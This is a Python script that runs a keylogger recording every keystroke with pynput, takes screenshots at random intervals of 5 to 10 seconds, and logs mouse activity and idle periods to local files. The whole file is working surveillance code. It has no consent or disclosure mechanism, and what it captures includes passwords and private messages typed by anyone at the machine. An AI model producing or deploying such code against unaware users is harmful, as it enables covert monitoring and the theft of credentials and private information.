import pyautogui
import time
import random
import os
from pynput import keyboard, mouse
import threading

# Global variables
keylogger_log = []
last_activity_time = time.time()

# Keylogger functions
def on_press(key):
    global last_activity_time
    last_activity_time = time.time()
    try:
        keylogger_log.append(key.char)
    except AttributeError:
        keylogger_log.append(str(key))

def on_release(key):
    global last_activity_time
    last_activity_time = time.time()
    if key == keyboard.Key.esc:
        return False

def on_move(x, y):
    global last_activity_time
    last_activity_time = time.time()

def on_click(x, y, button, pressed):
    global last_activity_time
    last_activity_time = time.time()

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as k_listener, \
         mouse.Listener(on_move=on_move, on_click=on_click) as m_listener:
        k_listener.join()
        m_listener.join()

def save_keylogger_log(folder_name):
    filename = f"keylogger_log_{time.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    folder_path = os.path.join("screenshots", folder_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    with open(os.path.join(folder_path, filename), "w") as f:
        f.write("".join(keylogger_log))

def take_screenshot(folder_name):
    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
    folder_path = os.path.join("screenshots", folder_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    screenshot = pyautogui.screenshot()
    screenshot_path = os.path.join(folder_path, f"{timestamp}.png")
    screenshot.save(screenshot_path)
    return timestamp, screenshot_path

def save_screenshot_list(screenshot_list, folder_name):
    filename = f"screenshot_list_{time.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    folder_path = os.path.join("screenshots", folder_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    with open(os.path.join(folder_path, filename), "w") as f:
        f.write("List of screenshots:\n")
        for timestamp, _ in screenshot_list:
            f.write(timestamp + "\n")
        f.write(f"Total screenshots captured: {len(screenshot_list)}\n")

def log_inactive_periods(folder_name):
    filename = f"inactive_periods_{time.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    folder_path = os.path.join("screenshots", folder_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    while True:
        time.sleep(10)  # Check every 10 seconds for inactivity
        current_time = time.time()
        if current_time - last_activity_time > 10:
            with open(os.path.join(folder_path, filename), "a") as f:
                f.write(f"Inactive period from {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(last_activity_time))} to {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(current_time))}\n")

def main():
    folder_name = time.strftime("%Y-%m-%d_%H-%M-%S")
    screenshot_list = []
    try:
        keylogger_thread = threading.Thread(target=start_keylogger)
        keylogger_thread.start()

        inactive_log_thread = threading.Thread(target=log_inactive_periods, args=(folder_name,))
        inactive_log_thread.start()

        while True:
            interval = random.randint(5, 10)  # Random time interval in seconds
            time.sleep(interval)
            timestamp, screenshot_path = take_screenshot(folder_name)
            screenshot_list.append((timestamp, screenshot_path))
    except KeyboardInterrupt:
        print("Screenshot capture stopped.")
        save_keylogger_log(folder_name)
        save_screenshot_list(screenshot_list, folder_name)

if __name__ == "__main__":
    main()
